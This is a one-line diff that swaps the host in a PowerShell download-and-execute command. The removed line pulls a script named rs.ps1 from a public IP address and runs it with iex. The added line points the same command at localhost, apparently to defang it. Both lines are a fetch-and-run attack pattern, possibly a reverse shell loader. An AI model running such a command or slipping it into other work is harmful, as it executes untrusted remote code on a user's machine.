@@ -1,1 +1,1 @@
-powershell iex (iwr http://51.255.110.79/rs.ps1  -UseBasicParsing)
+powershell iex (iwr http://127.0.0.1/rs.ps1  -UseBasicParsing)
